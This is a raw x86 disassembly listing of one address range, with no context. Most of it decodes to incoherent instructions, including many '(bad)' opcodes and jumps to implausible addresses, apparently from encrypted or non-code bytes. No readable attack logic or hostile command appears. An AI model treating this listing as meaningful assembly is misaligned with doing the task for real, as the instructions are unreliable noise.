  4114da:	or     dh,BYTE PTR [ecx]
  4114dc:	rcl    DWORD PTR [eax],0x44
  4114df:	mov    ebp,0x8cbb44cd
  4114e4:	(bad)  
  4114e5:	dec    ebx
  4114e6:	push   ds
  4114e7:	inc    edi
  4114e8:	jo     0x4114b2
  4114ea:	lods   al,BYTE PTR ds:[esi]
  4114eb:	aam    0xf9
  4114ed:	stos   DWORD PTR es:[edi],eax
  4114ee:	(bad)  [ecx-0x29ab8562]
  4114f4:	or     dl,dl
  4114f6:	dec    esp
  4114f7:	push   esp
  4114f8:	les    esi,FWORD PTR [ebx-0x64]
  4114fb:	enter  0x3105,0xa1
  4114ff:	sub    bh,BYTE PTR [edx-0x11ddc153]
  411505:	push   esi
  411506:	mov    edx,0x8b35b3dd
  41150b:	xchg   BYTE PTR [ebx],dl
  41150d:	or     eax,0xeb6a363a
  411512:	(bad)  
  411515:	pop    ds
  411516:	add    al,0xb2
  411518:	pop    esi
  411519:	and    eax,0xda738c80
  41151e:	pop    esi
  41151f:	icebp  
  411520:	mov    ecx,0x2fbe8afd
  411525:	adc    al,0x98
  411527:	fisub  DWORD PTR [edx]
  411529:	vsubsd xmm2,xmm7,QWORD PTR [ebx]
  41152d:	or     bh,BYTE PTR [ecx]
  41152f:	aaa    
  411530:	and    eax,ebp
  411532:	cmc    
  411533:	idiv   DWORD PTR [esi+0x19]
  411536:	push   esp
  411537:	fmul   DWORD PTR [edi+0x7bcb536d]
  41153d:	fcmovbe st,st(5)
  41153f:	xor    ebp,eax
  411541:	test   BYTE PTR [ebx+eax*4],dl
  411544:	cld    
  411545:	loop   0x411561
  411547:	cmp    ah,BYTE PTR [eax+ebp*8]
  41154a:	aam    0x4b
  41154c:	adc    BYTE PTR [eax],bl
  41154e:	sbb    al,0x74
  411550:	(bad)  
  411551:	push   ss
  411552:	mov    ebp,0xe1dbb6b9
  411557:	xchg   ebx,eax
  411558:	cld    
  411559:	out    dx,eax
  41155a:	call   DWORD PTR [edx+0x2d]
  41155d:	sbb    DWORD PTR [edx+0x4d],edi
  411560:	cwde   
  411561:	pop    ds
  411562:	ja     0x4115c3
  411564:	and    al,0xf7
  411566:	daa    
  411567:	in     eax,dx
  411568:	sub    BYTE PTR ss:[ecx-0x3e99942],bl
  41156f:	sub    al,0xb5
  411571:	popf   
  411572:	in     eax,0xbb
  411574:	stos   DWORD PTR es:[edi],eax
  411575:	add    eax,0x364c8f0e
  41157a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41157b:	data16 ds aam 0x24
  41157f:	xchg   BYTE PTR [eax+eiz*2],dh
  411582:	mov    ch,BYTE PTR [ebp-0x223247b7]
  411588:	cmc    
  411589:	mov    edx,0xbe053e37
  41158e:	mov    ds:0xe88c6e65,eax
  411593:	repnz mov ch,0x71
  411596:	loope  0x4115e6
  411598:	sbb    al,0x22
  41159a:	xchg   esi,eax
  41159b:	or     edx,DWORD PTR [edi+0xd867a86]
  4115a1:	mov    dh,0x3b
  4115a3:	xor    al,0x37
  4115a5:	add    DWORD PTR [edx],edx
  4115a7:	test   eax,0x87bdc4fd
  4115ac:	push   ebp
  4115ad:	scas   eax,DWORD PTR es:[edi]
  4115ae:	mov    ds:0x485a9c1,eax
  4115b3:	jmp    0xba851611
  4115b8:	sbb    BYTE PTR [ebp+0x4730d866],dl
  4115be:	stc    
  4115bf:	and    eax,0xbd621cab
  4115c4:	int3   
  4115c5:	imul   esi,DWORD PTR ds:0xffa946db,0x73
  4115cc:	jecxz  0x411616
  4115ce:	inc    ecx
  4115cf:	mov    cl,0xa7
  4115d1:	std    
  4115d2:	sahf   
  4115d3:	xchg   ebp,eax
  4115d4:	enter  0x5705,0xbd
  4115d8:	movq   QWORD PTR [edi-0x53],mm3
  4115dc:	mov    ecx,ecx
  4115de:	shr    bh,0xaf
  4115e1:	mov    bl,BYTE PTR [edx]
  4115e3:	repz scas eax,DWORD PTR es:[edi]
  4115e5:	mov    ds:0x241c1aba,eax
  4115ea:	add    BYTE PTR [eax+ecx*1-0x45],al
  4115ee:	jle    0x411642
  4115f0:	dec    ebx
  4115f1:	jg     0x4115a0
  4115f3:	xlat   BYTE PTR ds:[ebx]
  4115f4:	cwde   
  4115f5:	inc    edi
  4115f6:	cmp    BYTE PTR [esi],dh
  4115f8:	nop
  4115f9:	mov    ds:0xd171a007,eax
  4115fe:	pop    eax
  4115ff:	push   cs
  411600:	not    BYTE PTR [ebx]
  411602:	data16 mov dh,0x46
  411605:	(bad)  
  411606:	das    
  411607:	pushf  
  411608:	call   DWORD PTR [edx+0x7f]
  41160b:	(bad)  
  41160c:	je     0x411639
  41160e:	sub    dh,BYTE PTR [eax+eiz*1]
  411611:	ret    
  411612:	inc    eax
  411613:	xor    al,0x66
  411615:	aad    0x4e
  411617:	adc    dh,al
  411619:	out    0x3c,eax
  41161b:	pop    edi
  41161c:	xor    ecx,esp
  41161e:	in     al,dx
  41161f:	pop    esi
  411620:	and    esi,DWORD PTR [ebp-0x5daabc74]
  411626:	dec    ebp
  411627:	mov    ch,0xaf
  411629:	cmp    eax,0x2c7b2955
  41162e:	loope  0x4115ea
  411630:	jmp    esi
  411632:	xchg   BYTE PTR [esi+0x45],ch
  411635:	into   
  411636:	pop    ebp
  411637:	dec    ebx
  411638:	adc    ebp,DWORD PTR [ecx]
  41163a:	dec    ebp
  41163b:	neg    BYTE PTR [ecx]
  41163d:	dec    ebp
  41163e:	or     eax,0xaaf6b3d7
  411643:	sub    al,0x40
  411645:	int    0x97
  411647:	mov    ah,0x62
  411649:	jno    0x41163d
  41164b:	cmp    dl,bh
  41164d:	jbe    0x411662
  41164f:	(bad)  
  411651:	sbb    al,0xf7
  411653:	mov    bh,0x9c
  411655:	sbb    bl,BYTE PTR [ebx+0x6a983564]
  41165b:	dec    ebp
  41165c:	aam    0x24
  41165e:	mov    dh,0xb6
  411660:	adc    al,0xd0
  411662:	in     al,0x14
  411664:	das    
  411665:	dec    ecx
  411666:	hlt    
  411667:	dec    ecx
  411668:	inc    sp
  41166a:	loopne 0x411600
  41166c:	rcr    DWORD PTR [ecx-0x31ee1896],1
  411672:	mov    ds:0x2505ad95,al
  411677:	jae    0x41163c
  411679:	fwait
  41167a:	xor    DWORD PTR [ebp-0x6fece76a],edx
  411680:	pop    ebp
  411681:	sbb    cl,ah
  411683:	cs dec ebx
  411685:	adc    al,0x14
  411687:	inc    ebx
  411688:	inc    ecx
  411689:	scas   al,BYTE PTR es:[edi]
  41168a:	(bad)  
  41168b:	in     eax,0x2f
  41168d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41168f:	cmp    al,0x8c
  411691:	jne    0x411711
  411693:	das    
  411694:	in     eax,0xe4
  411696:	pop    esp
  411697:	and    ah,dl
  411699:	sbb    cl,dh
  41169b:	loop   0x411709
  41169d:	call   0xf9bf:0x474d6bef
  4116a4:	xor    eax,0x80d403be
  4116a9:	int3   
  4116aa:	pop    esp
  4116ab:	mov    esp,0x606e0ac6
  4116b0:	lahf   
  4116b1:	xor    al,0xf6
  4116b3:	xor    ebp,eax
  4116b5:	push   cs
  4116b6:	pop    esp
  4116b7:	gs push edx
  4116b9:	pushf  
  4116ba:	and    DWORD PTR [esi-0xe],edi
  4116bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116be:	jge    0x4116c3
  4116c0:	or     eax,edi
  4116c2:	cmp    eax,0xdbf283f4
  4116c7:	xor    al,0xd1
  4116c9:	xor    al,0xed
  4116cb:	shl    BYTE PTR [eax+0x6a],1
  4116ce:	ret    0xd2e
  4116d1:	test   BYTE PTR [ecx+eiz*1-0x60fe6b9b],bh
  4116d8:	add    BYTE PTR [ecx+0x2d],dl
  4116db:	arpl   di,bp
  4116dd:	mov    eax,0xa2fc250f
  4116e2:	mov    eax,ds:0x10484252
  4116e7:	xor    eax,0xe41e3866
  4116ec:	loopne 0x411743
  4116ee:	dec    ebp
  4116ef:	test   edi,edx
  4116f1:	call   0xa25b7050
  4116f6:	push   esi
  4116f7:	adc    dl,BYTE PTR [eax+0x3f]
  4116fa:	push   esp
  4116fb:	jbe    0x41173d
  4116fd:	fisubr DWORD PTR [edx-0x48]
  411700:	mov    bl,0xed
  411702:	adc    edx,DWORD PTR [edi]
  411704:	loopne 0x4116a6
  411706:	mov    ds:0x3cdf1784,al
  41170b:	cmp    ecx,esi
  41170d:	mov    WORD PTR [ebx+edi*4-0x62],ss
  411711:	xor    al,0xd6
  411713:	adc    ah,BYTE PTR [eax-0x6b4e5016]
  411719:	fdiv   st(5),st
  41171b:	lods   eax,DWORD PTR ds:[esi]
  41171c:	inc    BYTE PTR [eax+edi*4-0x8]
  411720:	outs   dx,BYTE PTR ds:[esi]
  411721:	rol    cl,cl
  411723:	stos   BYTE PTR es:[edi],al
  411724:	jno    0x411717
  411726:	jmp    0x6e83ad45
  41172b:	dec    ebp
  41172c:	sbb    eax,DWORD PTR [esp+edx*8+0x29b4613b]
  411733:	stos   BYTE PTR es:[edi],al
  411734:	int3   
  411735:	jl     0x411727
  411737:	test   al,0x7d
  411739:	add    eax,0xe201c25f
  41173e:	rcr    BYTE PTR ds:0x67aac9b2,0xf7
  411745:	adc    bh,BYTE PTR [ebp-0x3e1b1e]
  41174b:	adc    BYTE PTR [eax+edx*8-0x77],al
  41174f:	pop    ecx
  411750:	shl    DWORD PTR [edx+ecx*1+0x22],cl
  411754:	or     al,0xf0
  411756:	adc    cl,ch
  411758:	das    
  411759:	ffreep st(7)
  41175b:	daa    
  41175c:	adc    eax,0xeacebab9
  411761:	mov    ds:0x2381ad18,eax
  411766:	pop    esp
  411767:	mov    BYTE PTR [esi],dl
  411769:	nop
  41176a:	xchg   edi,eax
  41176b:	add    eax,DWORD PTR [edx]
  41176d:	adc    eax,0x6f0b8094
  411772:	and    DWORD PTR [eax+eax*8-0x72],edx
  411776:	outs   dx,DWORD PTR ds:[esi]
  411777:	lahf   
  411778:	dec    bp
  41177a:	adc    edx,DWORD PTR [esi+eiz*2]
  41177d:	or     BYTE PTR ds:[eax-0x32],ah
  411781:	push   ebp
  411782:	in     eax,0xdb
  411784:	test   edx,edx
  411786:	or     al,0xcb
  411788:	pushw  cs
  41178a:	je     0x411756
  41178c:	rol    dl,cl
  41178e:	popa   
  41178f:	fxch   st(4)
  411791:	arpl   WORD PTR [esi],di
  411793:	jl     0x41175e
  411795:	aad    0xb3
  411797:	pop    ecx
  411798:	pushf  
  411799:	adc    al,0xa
  41179b:	retf   0x634
  41179e:	std    
  41179f:	(bad)  
  4117a0:	ins    DWORD PTR es:[edi],dx
  4117a1:	stc    
  4117a2:	sbb    BYTE PTR [ebx-0x41],bh
  4117a5:	out    dx,al
  4117a6:	cld    
  4117a7:	lods   al,BYTE PTR ds:[esi]
  4117a8:	fsub   st(2),st
  4117aa:	rcr    DWORD PTR fs:[edi-0x37d1cba0],1
  4117b1:	shl    BYTE PTR [ebp-0x1],0x82
  4117b5:	repnz rcr BYTE PTR [edx-0xa261f4],cl
  4117bc:	retf   
  4117bd:	mov    edx,ebp
  4117bf:	fisttp WORD PTR ds:0xa456bfbf
  4117c5:	xchg   ecx,eax
  4117c6:	call   0xeb88f33a
  4117cb:	loopne 0x411754
  4117cd:	mul    BYTE PTR [eax+edi*1-0x23]
  4117d1:	lock das 
  4117d3:	popf   
  4117d4:	fnsave [eax+0x23]
  4117d7:	out    0x1d,al
  4117d9:	sub    cl,BYTE PTR [ebp-0x44201b9c]
  4117df:	mov    esp,0xe932650d
  4117e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e5:	xlat   BYTE PTR es:[ebx]
  4117e7:	jecxz  0x4117f9
  4117e9:	inc    ebp
  4117ea:	mov    ebx,0xc01051ac
  4117ef:	push   esi
  4117f0:	es xchg edx,eax
  4117f2:	(bad)  
  4117f3:	mov    edi,0x8ff9a105
  4117f8:	jnp    0x4117c4
  4117fa:	sub    edi,0x474db3f1
  411800:	dec    eax
  411801:	sub    edi,DWORD PTR ds:0x84a4b6db
  411807:	neg    ebx
  411809:	sbb    edi,eax
  41180b:	mov    edx,0xc1d1f6c7
  411810:	rcl    BYTE PTR [ebp-0x553bc277],0x15
  411817:	les    ebx,FWORD PTR [edx+0x26]
  41181a:	push   0x66
  41181c:	stos   DWORD PTR es:[edi],eax
  41181d:	addr16 xor eax,0x9a67d1eb
  411823:	push   edi
  411824:	xchg   edi,eax
  411825:	bts    esi,0x3c
  411829:	sbb    esi,edx
  41182b:	mov    cl,BYTE PTR [edi+eax*4+0x7cebba9b]
  411832:	cmp    ch,0x46
  411835:	sub    ebp,edi
  411837:	adc    al,0xb4
  411839:	shl    DWORD PTR [esi],cl
  41183b:	js     0x411851
  41183d:	fdiv   DWORD PTR [edx+0x589fdf89]
  411843:	adc    al,0x6a
  411845:	sti    
  411846:	mov    BYTE PTR [ecx+0x1d],cl
  411849:	add    ch,ch
  41184b:	xor    edi,DWORD PTR [esi+0xdb66caa]
  411851:	xchg   esi,eax
  411852:	jmp    0xaf392b34
  411857:	lods   al,BYTE PTR ds:[esi]
  411858:	inc    eax
  411859:	pop    ds
  41185a:	mov    edx,0x64bce4bc
  41185f:	mov    edi,DWORD PTR [eax+0x3a]
  411862:	aad    0xa0
  411864:	mov    ds:0xcab3972d,eax
  411869:	dec    esi
  41186a:	dec    ecx
  41186b:	stos   BYTE PTR es:[edi],al
  41186c:	aad    0xf6
  41186e:	push   esi
  41186f:	pusha  
  411870:	inc    ecx
  411871:	cdq    
  411872:	sti    
  411873:	nop
  411874:	test   BYTE PTR [ebx+0x46952181],bh
  41187a:	arpl   WORD PTR [edi],si
  41187c:	cmp    eax,0x80e12348
  411881:	arpl   WORD PTR ds:0xd03e6fc1,bp
  411887:	(bad)  
  411888:	pop    es
  411889:	out    dx,al
  41188a:	dec    edx
  41188b:	fnsave [ebx-0x63af0da6]
  411891:	cmp    bh,BYTE PTR [edx+0x3e]
  411894:	cmp    bh,BYTE PTR [ebx]
  411896:	ja     0x4118ec
  411898:	or     al,0xab
  41189a:	xchg   ecx,eax
  41189b:	fbld   TBYTE PTR ds:0x608b1abb
  4118a1:	xchg   esp,eax
  4118a2:	dec    esp
  4118a3:	loope  0x411834
  4118a5:	xor    al,0x88
  4118a7:	imul   DWORD PTR [esi]
  4118a9:	imul   esp,DWORD PTR [ebx-0x22],0x24130311
  4118b0:	cmp    DWORD PTR [esi+edi*1+0x61],esp
  4118b4:	stos   BYTE PTR es:[edi],al
  4118b5:	jecxz  0x4118cb
  4118b7:	xor    DWORD PTR [esi-0x77],esi
  4118ba:	not    DWORD PTR [esi]
  4118bc:	sbb    al,0x54
  4118be:	jle    0x4118b6
  4118c0:	inc    eax
  4118c1:	les    ecx,FWORD PTR [esi]
  4118c3:	xor    bl,BYTE PTR [edx-0x3b]
  4118c6:	test   eax,0x9ad229a2
  4118cb:	imul   edx,DWORD PTR [esi],0x36
  4118ce:	push   ebp
  4118cf:	cli    
  4118d0:	dec    edi
  4118d1:	into   
  4118d2:	jae    0x41193f
  4118d4:	cmp    BYTE PTR [edx],ah
  4118d6:	pushf  
  4118d7:	push   0x68702d25
  4118dc:	out    dx,eax
  4118dd:	dec    ebx
  4118de:	pop    edi
  4118df:	cwde   
  4118e0:	add    BYTE PTR [ebx],ch
  4118e2:	int    0xa2
  4118e4:	dec    esi
  4118e5:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e7:	je     0x41193c
  4118e9:	(bad)  [eax+0x308f820e]
  4118ef:	gs push 0x2fb715e4
  4118f5:	(bad)  
  4118f6:	jne    0x4118db
  4118f8:	scas   eax,DWORD PTR es:[edi]
  4118f9:	push   esi
  4118fa:	loope  0x4118ee
  4118fc:	jnp    0x411950
  4118fe:	test   eax,0x7420619d
  411903:	(bad)  
  411904:	jbe    0x411941
  411906:	cmp    ch,BYTE PTR [edx+eiz*2]
  411909:	(bad)  
  41190a:	loope  0x411893
  41190c:	mul    DWORD PTR [esi+0x4b9b4503]
  411912:	xor    eax,0xdfd6128
  411917:	loop   0x41196b
  411919:	pop    ecx
  41191a:	shl    BYTE PTR [edx+esi*1-0x7c30add2],1
  411921:	mov    dl,0xcd
  411923:	ror    DWORD PTR [edi-0x44],cl
  411926:	addr16 (bad) 
  411928:	jns    0x411940
  41192a:	mov    ds:0xf726946a,eax
  41192f:	pop    eax
  411930:	lock sbb edx,DWORD PTR [edi-0x52b1510c]
  411937:	adc    BYTE PTR [ebp-0x5b],dh
  41193a:	minps  xmm7,XMMWORD PTR ds:0x5c55bc11
  411941:	das    
  411942:	out    0x3e,eax
  411944:	sub    cl,bh
  411946:	add    al,0x94
  411948:	jge    0x4119b4
  41194a:	js     0x4119bf
  41194c:	loope  0x4118ea
  41194e:	retf   0xfa63
  411951:	les    ebx,FWORD PTR [eax]
  411953:	ins    BYTE PTR es:[edi],dx
  411954:	sub    edi,DWORD PTR [esi*4-0x6b7435e4]
  41195b:	dec    edi
  41195c:	call   0x7c367040
  411961:	stos   BYTE PTR es:[edi],al
  411962:	inc    ebp
  411963:	mov    fs,WORD PTR [eax-0x5e47b942]
  411969:	gs inc edi
  41196b:	aas    
  41196c:	div    edx
  41196e:	sub    dh,BYTE PTR [edx-0x50]
  411971:	dec    esp
  411972:	int3   
  411973:	push   ds
  411974:	or     cl,BYTE PTR [edi-0x8205997]
  41197a:	and    BYTE PTR [ebp-0x539f5dd9],dl
  411980:	sbb    esi,DWORD PTR [ecx]
  411982:	jl     0x41192e
  411984:	push   ebx
  411985:	dec    ebx
  411986:	and    DWORD PTR [esi+ecx*4],edx
  411989:	xchg   edx,eax
  41198a:	adc    edi,DWORD PTR [eax]
  41198c:	or     BYTE PTR [edx+eax*2+0x56],0xa1
  411991:	or     esp,DWORD PTR [ecx-0xc]
  411994:	dec    esp
  411995:	inc    edx
  411996:	push   ebp
  411997:	push   ds
  411998:	iret   
  411999:	xchg   esp,eax
  41199a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41199b:	xlat   BYTE PTR ds:[ebx]
  41199c:	ret    0x3778
  41199f:	lock sbb al,BYTE PTR [esi]
  4119a2:	pop    esi
  4119a3:	in     al,0x42
  4119a5:	xlat   BYTE PTR ds:[ebx]
  4119a6:	push   ss
  4119a7:	inc    ebp
  4119a8:	pop    ds
  4119a9:	dec    esp
  4119aa:	outs   dx,DWORD PTR ds:[esi]
  4119ab:	fcom   st(3)
  4119ad:	mov    fs,edi
  4119af:	pop    esp
  4119b0:	mov    ds:0xa2a1b59,eax
  4119b5:	icebp  
  4119b6:	push   esp
  4119b7:	outs   dx,BYTE PTR ds:[esi]
  4119b8:	xchg   edi,eax
  4119b9:	xor    ch,bl
  4119bb:	or     eax,0xd356ac5b
  4119c0:	mov    eax,ds:0x7ab6a569
  4119c5:	adc    bh,BYTE PTR [eax-0x76]
  4119c8:	jne    0x41199e
  4119ca:	test   eax,0x82ed5223
  4119cf:	push   0xffffffcc
  4119d1:	dec    edi
  4119d2:	sub    bh,BYTE PTR [edx+0x66]
  4119d5:	mov    ds:0xbb1c3878,eax
  4119da:	lock inc ecx
  4119dc:	test   eax,0xa091b5e5
  4119e1:	dec    ecx
  4119e2:	scas   al,BYTE PTR es:[edi]
  4119e3:	neg    BYTE PTR [ebx+edx*2-0x1b2cc1b8]
  4119ea:	scas   al,BYTE PTR es:[edi]
  4119eb:	adc    eax,0x10bad32d
  4119f0:	xchg   edx,eax
  4119f1:	jp     0x4119d0
  4119f3:	or     eax,0xdcf03169
  4119f8:	pop    eax
  4119f9:	test   BYTE PTR [edi],bl
  4119fb:	push   esp
  4119fc:	sti    
  4119fd:	mov    esi,0x42980797
  411a02:	pop    edi
  411a03:	sbb    eax,0x527a62ac
  411a08:	nop
  411a09:	push   eax
  411a0a:	push   ebx
  411a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a0c:	(bad)  
  411a0d:	mov    eax,ds:0xe56c6038
  411a12:	fldenv ds:[esp+eiz*4-0x299021fc]
  411a1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a1b:	inc    esp
  411a1c:	rcl    DWORD PTR [eax],1
  411a1e:	pop    ss
  411a1f:	pop    es
  411a20:	jae    0x411a53
  411a22:	out    0xf,al
  411a24:	mov    esp,0x6f87c39f
  411a29:	loopne 0x4119ad
  411a2b:	loope  0x4119bd
  411a2d:	mov    esp,0x5950298
  411a32:	aas    
  411a33:	ret    0x4f8d
  411a36:	push   esp
  411a37:	mov    edi,0x7a581546
  411a3c:	adc    ebx,DWORD PTR [esi-0xf]
  411a3f:	jns    0x411aac
  411a41:	mov    ds:0x43816f34,al
  411a46:	adc    al,0x1d
  411a48:	cli    
  411a49:	add    al,0x63
  411a4b:	mov    ebx,0x7b51c039
  411a50:	cmp    DWORD PTR ds:0x6de49a68,0x8f0c1d72
  411a5a:	retf   0x10c7
  411a5d:	lahf   
  411a5e:	stc    
  411a5f:	loopne 0x411a97
  411a61:	lods   eax,DWORD PTR ds:[esi]
  411a62:	fisttp QWORD PTR [edi+0x37]
  411a65:	daa    
  411a66:	dec    esp
  411a67:	inc    edx
  411a68:	aam    0x82
  411a6a:	dec    ebx
  411a6b:	mov    ah,0x78
  411a6d:	mov    ecx,eax
  411a6f:	fsubr  QWORD PTR [edi]
  411a71:	or     eax,0x8758d906
  411a76:	les    edi,FWORD PTR [edi+0x23960b6]
  411a7c:	sbb    edx,esp
  411a7e:	ins    DWORD PTR es:[edi],dx
  411a7f:	dec    esi
  411a80:	jmp    0x5432a9db
  411a85:	mov    cl,bl
  411a87:	std    
  411a88:	sbb    cl,BYTE PTR [ecx+edx*4+0x363900c8]
  411a8f:	mov    cl,0x88
  411a91:	inc    edx
  411a92:	bound  edi,QWORD PTR [edi+0x1a6f8f6]
  411a98:	or     al,0x9e
  411a9a:	jb     0x411ae9
  411a9c:	loop   0x411b15
  411a9e:	mov    es,ebx
  411aa0:	xor    dl,BYTE PTR [edi+eiz*2-0x70f20338]
  411aa7:	lds    eax,FWORD PTR [ebp-0x5fde0158]
  411aad:	add    eax,0xcfe3e3e
  411ab2:	xchg   edx,eax
  411ab3:	(bad)  
  411ab5:	dec    edi
  411ab6:	dec    esp
  411ab7:	adc    ebp,DWORD PTR [ebx]
  411ab9:	fisub  WORD PTR [edx+0x2c]
  411abc:	imul   ecx,DWORD PTR [ebx-0xc357e8e],0x4817e2d0
  411ac6:	hlt    
  411ac7:	inc    ecx
  411ac8:	sar    BYTE PTR ds:0xfeb9e62d,0xf1
  411acf:	popf   
  411ad0:	jl     0x411a53
  411ad2:	and    ebp,DWORD PTR [esi]
  411ad4:	dec    ebp
  411ad5:	or     BYTE PTR [edx+0x33393e35],cl
  411adb:	add    dl,bh
  411add:	push   ecx
  411ade:	daa    
  411adf:	(bad)  
  411ae0:	push   0x39
  411ae2:	push   0x69
  411ae4:	shl    DWORD PTR [edi+0x5bc6c029],0x5c
  411aeb:	and    dl,ah
  411aed:	dec    edx
  411aee:	xor    BYTE PTR [ebp+0x50],ch
  411af1:	and    DWORD PTR [edi],ebx
  411af3:	push   ds
  411af4:	retf   
  411af5:	cmp    edi,DWORD PTR [ecx]
  411af7:	push   ds
  411af8:	jmp    0x85ad:0x45087e3b
  411aff:	jb     0x411b21
  411b01:	dec    edx
  411b02:	pop    esi
  411b03:	call   0x309a:0x7147610d
  411b0a:	sub    eax,0xf393005
  411b0f:	mov    ds:0x2dc1c51f,al
  411b14:	jae    0x411b0c
  411b16:	adc    al,0x8e
  411b18:	mov    eax,DWORD PTR [ebp+0x4545f8f3]
  411b1e:	pop    ecx
  411b1f:	add    BYTE PTR [edx+ecx*8-0x746c1b26],cl
  411b26:	icebp  
  411b27:	sub    al,0xde
  411b29:	jp     0x411b07
  411b2b:	sub    eax,0xc6986431
  411b30:	add    DWORD PTR [ebx-0x18962286],eax
  411b36:	mov    BYTE PTR [edx+0x12],bh
  411b39:	jno    0x411b08
  411b3b:	dec    edi
  411b3c:	xchg   ebp,eax
  411b3d:	(bad)  
  411b3e:	adc    al,0xf7
  411b40:	push   0xe79a982e
  411b45:	adc    bh,BYTE PTR [edi]
  411b47:	or     eax,0xab7a1a3a
  411b4c:	ins    DWORD PTR es:[edi],dx
  411b4d:	je     0x411b34
  411b4f:	shl    ecx,0x99
  411b52:	fimul  DWORD PTR ds:0x909c17f9
  411b58:	push   ebp
  411b59:	xor    eax,0xa7c22a19
  411b5e:	ss (bad) 
  411b60:	push   0xb8e97bdb
  411b65:	mov    ebp,0x972a5d6f
  411b6a:	ret    
  411b6b:	ffree  st(7)
  411b6d:	add    ebp,DWORD PTR [edi]
  411b6f:	lods   al,BYTE PTR ds:[esi]
  411b70:	out    dx,eax
  411b71:	xchg   ebx,eax
  411b72:	and    eax,0x45e17769
  411b77:	jg     0x411b1b
  411b79:	add    cl,al
  411b7b:	pop    ds
  411b7c:	mov    DWORD PTR es:[esi-0x23],edx
  411b80:	jnp    0x411b31
  411b82:	lock loopne 0x411b66
  411b85:	dec    edi
  411b86:	das    
  411b87:	ret    0x2a7a
  411b8a:	mov    eax,0xc882a74b
  411b8f:	jb     0x411bea
  411b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b92:	aas    
  411b93:	jnp    0x411b30
  411b95:	ror    BYTE PTR [esi],0x86
  411b98:	sbb    al,0xb0
  411b9a:	adc    DWORD PTR [edi-0x25],eax
  411b9d:	dec    ecx
  411b9e:	xchg   DWORD PTR [edx],ebx
  411ba0:	add    ch,0xe0
  411ba3:	sub    ebx,ebx
  411ba5:	ret    
  411ba6:	dec    edi
  411ba7:	(bad)
  411baa:	lods   al,BYTE PTR ds:[esi]
  411bab:	loopne 0x411b3f
  411bad:	cmp    DWORD PTR [ebx+0x362fc1b2],esi
  411bb3:	out    0x84,al
  411bb5:	pop    esi
  411bb6:	mov    edi,0x10f0ec2f
  411bbb:	inc    esp
  411bbc:	push   0xffffffdf
  411bbe:	mov    edi,0xdbe410d2
  411bc4:	lahf   
  411bc5:	mov    esp,0xb0428d87
  411bca:	pop    esi
  411bcb:	inc    ecx
  411bcc:	xchg   ch,bh
  411bce:	push   esp
  411bcf:	pop    edi
  411bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd1:	xchg   ebp,eax
  411bd2:	(bad)  
  411bd3:	loope  0x411b6a
  411bd5:	jp     0x411c55
  411bd7:	dec    ecx
  411bd9:	nop
  411bda:	sbb    dl,BYTE PTR [edx-0x2e1fb878]
  411be0:	push   cs
  411be1:	das    
  411be2:	ins    DWORD PTR es:[edi],dx
  411be3:	or     eax,0x6dd9bd4
  411be8:	jae    0x411bc1
  411bea:	retf   0x6cd0
  411bed:	mov    fs,edi
  411bef:	test   BYTE PTR [eax+edi*8-0x53],ah
  411bf3:	inc    edx
  411bf4:	mov    ch,0x79
  411bf6:	cmp    cl,ah
  411bf8:	outs   dx,BYTE PTR ds:[esi]
  411bf9:	dec    esp
  411bfa:	stc    
  411bfb:	xor    eax,0x841c6fa4
  411c00:	je     0x411b9b
  411c02:	xor    edi,DWORD PTR [eax+0x61edba22]
  411c08:	pop    ss
  411c09:	lds    esi,FWORD PTR [esi]
  411c0b:	sbb    dh,0xb8
  411c0e:	das    
  411c0f:	push   es
  411c10:	inc    edi
  411c11:	out    0xef,eax
  411c13:	jg     0x411c87
  411c15:	mov    edx,0x9aca6588
  411c1a:	cmp    BYTE PTR [ecx+eax*2],cl
  411c1d:	(bad)  
  411c1e:	pop    ecx
  411c1f:	in     al,dx
  411c20:	xor    eax,0x4f31e9da
  411c25:	shl    BYTE PTR [edi+0xeda6955],0x4d
  411c2c:	sub    ch,BYTE PTR [edi+0x480533f4]
  411c32:	ficom  WORD PTR [edx+0x52]
  411c35:	or     ah,BYTE PTR [esi]
  411c37:	test   al,0x54
  411c39:	fnstsw WORD PTR [ecx-0x2c5af37a]
  411c3f:	jmp    0x803346d
  411c44:	inc    ebx
  411c45:	std    
  411c46:	clc    
  411c47:	jmp    0xec420b45
  411c4c:	out    0xb0,al
  411c4e:	fidiv  DWORD PTR [edi-0x52]
  411c51:	sbb    DWORD PTR [edi-0x77],edx
  411c54:	and    DWORD PTR [edi-0x6b04fc14],eax
  411c5a:	push   eax
  411c5b:	inc    esi
  411c5c:	das    
  411c5d:	xchg   edx,eax
  411c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c5f:	mov    ebp,0x7277fdb2
  411c64:	lods   al,BYTE PTR ds:[esi]
  411c65:	pop    esi
  411c66:	ret    0xa24c
  411c69:	cmp    eax,DWORD PTR [edx]
  411c6b:	sbb    DWORD PTR [eax+0x2e],ebx
  411c6e:	mov    cl,ch
  411c70:	inc    ecx
  411c71:	dec    ebp
  411c72:	sub    BYTE PTR [ebx+ebx*1-0x7eeb0c8],al
  411c79:	sub    esp,DWORD PTR [ebx+0x34e68e40]
  411c7f:	inc    eax
  411c80:	push   ds
  411c81:	sub    ecx,DWORD PTR [ebp-0x5dd715bb]
  411c87:	adc    BYTE PTR [ecx+0x44aa24ca],0x8b
  411c8e:	arpl   WORD PTR [edi-0x32],sp
  411c91:	jl     0x411d0f
  411c93:	loope  0x411cec
  411c95:	sub    DWORD PTR [ecx-0x55933cbe],ebx
  411c9b:	adc    al,BYTE PTR [ecx-0x2a]
  411c9e:	sbb    ebp,DWORD PTR [eax-0x7554af7d]
  411ca4:	pop    ss
  411ca5:	adc    edx,ebp
  411ca7:	push   edx
  411ca8:	sbb    bh,BYTE PTR [edx+0xf]
  411cab:	mov    dh,0xc9
  411cad:	pop    ss
  411cae:	outs   dx,BYTE PTR ds:[esi]
  411caf:	push   edi
  411cb0:	sbb    DWORD PTR [eax-0x4b],edx
  411cb3:	stc    
